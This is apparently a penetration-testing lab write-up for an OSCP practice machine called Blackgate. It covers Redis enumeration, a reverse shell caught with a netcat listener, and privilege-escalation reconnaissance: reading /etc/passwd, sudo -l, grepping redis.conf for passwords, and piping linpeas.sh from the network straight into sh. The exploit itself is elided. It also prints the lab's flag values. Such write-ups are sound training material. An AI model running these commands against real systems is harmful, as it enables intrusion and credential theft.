...
![OSCP - Blackgate - Linux - image1](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image1.png)
- Enumerated `redis` with command `INFO`
![OSCP - Blackgate - Linux - image2](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image2.png)
- Enumerated `redis` with command `client list`
![OSCP - Blackgate - Linux - image3](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image3.png)
- Enumerated `redis` with command `CONFIG GET *` and identified `dump.rdb`
![OSCP - Blackgate - Linux - image4](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image4.png)
---
# Exploitation
...
![OSCP - Blackgate - Linux - image5](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image5.png)
- Caught reverse shell with netcat listener on port `4444` with user `prudence`
![OSCP - Blackgate - Linux - image6](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image6.png)

---
# Privilege Escalation
## Local Enumeration
 - Ran `cat /home/prudence/local.txt` and printed local flag `704c046724f3d52f31c9567446105364`
 ![OSCP - Blackgate - Linux - image7](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image7.png)
- Ran `cat /home/prudence/notes.txt` and identified `protected mode` not turned on
![OSCP - Blackgate - Linux - image8](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image8.png)
- Ran `cat /etc/passwd` to identify any other users
![OSCP - Blackgate - Linux - image9](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image9.png)
- Ran `sudo -l` to check `sudo` privileges and identified `prudence` can run `/usr/local/bin/redis-status` without a password
![OSCP - Blackgate - Linux - image10](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image10.png)
- Ran `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` to download & run `linpeas.sh` 
![OSCP - Blackgate - Linux - image11](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image11.png)
- Identified potential vulnerabilities for privilege escalation
![OSCP - Blackgate - Linux - image12](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image12.png)
- script crashed at `Analyzing Redis Files`
![OSCP - Blackgate - Linux - image13](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image13.png)
- Checked for `redis.conf` and ran `grep -i pass /etc/redis/redis.conf` to check for passwords
![OSCP - Blackgate - Linux - image14](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image14.png)
- Ran `sudo /usr/local/bin/redis-status` and identified `redis-service` requires authorization key
![OSCP - Blackgate - Linux - image15](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image15.png)
...
![OSCP - Blackgate - Linux - image16](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image16.png)
- Ran `cat /root/proof.txt` to print `deefd9189289f94bf366e55ae58fdfd3`
![OSCP - Blackgate - Linux - image17](/files/OSCP%20-%20Blackgate%20-%20Linux%20-%20image17.png)
---
# Trophy & Loot
